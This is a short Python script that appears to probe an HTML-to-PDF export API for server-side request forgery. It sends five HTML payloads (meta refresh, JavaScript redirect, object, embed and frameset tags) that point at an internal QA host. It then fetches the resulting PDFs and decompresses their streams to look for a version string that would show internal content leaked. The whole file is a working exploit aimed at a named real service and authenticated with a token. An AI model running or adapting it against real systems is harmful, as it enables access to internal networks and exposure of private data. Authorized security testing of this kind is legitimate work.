import json,subprocess,os,re,zlib,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def gen(html,name,typ='pdf'):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read()).get('url')
    except: return c,None
def fetch(url):
    subprocess.run(['curl','-s','-m','60','-o','/tmp/v.pdf',url])
    return open('/tmp/v.pdf','rb').read()
def streams(data):
    out=[]
    for m in re.finditer(rb'stream\r?\n(.*?)endstream',data,re.S):
        try: out.append(zlib.decompress(m.group(1)).decode('latin-1'))
        except: pass
    return '\n'.join(out)
tag='zx'+uuid.uuid4().hex[:8]
INTERNAL='http://integrations.qa.soxhubapp.com/version'
tests=[
 ("meta-refresh", f'<html><head><meta http-equiv="refresh" content="0;url={INTERNAL}"></head><body>ZX</body></html>'),
 ("js-location",  f'<html><body>ZX<script>location.href="{INTERNAL}"</script></body></html>'),
 ("object-html",  f'<object data="{INTERNAL}" type="text/html" width="900" height="800"></object>'),
 ("embed-html",   f'<embed src="{INTERNAL}" type="text/html" width="900" height="800">'),
 ("frame",        f'<frameset><frame src="{INTERNAL}"></frameset>'),
]
for label,html in tests:
    c,url=gen(html,f"zx-{tag}-{label}")
    if not url:
        print(f"  {label:14} gen={c} (no url)"); continue
    d=fetch(url)
    s=streams(d)
    hit = ('v1.16.1' in s) or ('v1.16.1' in d.decode('latin-1',errors='replace'))
    print(f"  {label:14} pdf={len(d)}B Tj={s.count('Tj')} v1.16.1={hit}")
open('/tmp/tag200','w').write(tag)
